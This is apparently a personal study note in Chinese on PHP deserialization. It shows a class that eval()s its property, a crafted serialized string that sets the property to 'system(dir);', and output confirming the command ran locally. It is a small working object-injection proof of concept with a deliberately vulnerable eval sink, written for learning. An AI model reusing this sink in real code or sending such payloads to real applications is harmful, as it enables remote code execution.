---
tags:
  - serialize
  - PHP
Date: 2026-01-11
---
```php
<?php

//highlight_file(__FILE__);

error_reporting(0);

class test{

    public $a = 'echo "this is test!!";';

    public function displayVar() {

        eval($this->a);

    }

}

  

$c = new test();

$ser = serialize($c);

var_dump($ser);

$c -> displayVar();

  

$e = 'O:4:"test":1:{s:1:"a";s:12:"system(dir);";}';

$f = unserialize($e);

var_dump($f);

$f->displayVar();

  

?>
```
首先定义了test类后，类定义本身$a对应了echo的命令并且由方法执行
$e由后续自定义序列化字符串后再次反序列化调用test的方法

```php
string(53) "O:4:"test":1:{s:1:"a";s:22:"echo "this is test!!";";}"

this is test!!D:\phpstudy_pro\WWW\serialize\ex\eg.php:18:

class test#2 (1) {

public $a =>

string(12) "system(dir);"

}

Volume in drive D is Software

Volume Serial Number is 3899-599F

Directory of d:\phpstudy_pro\WWW\serialize\ex

2026/01/11 14:47 <DIR> .

2026/01/11 14:46 <DIR> ..

2026/01/11 14:52 459 eg.php

1 File(s) 459 bytes

2 Dir(s) 124,418,113,536 bytes free
```
system(dir)成功执行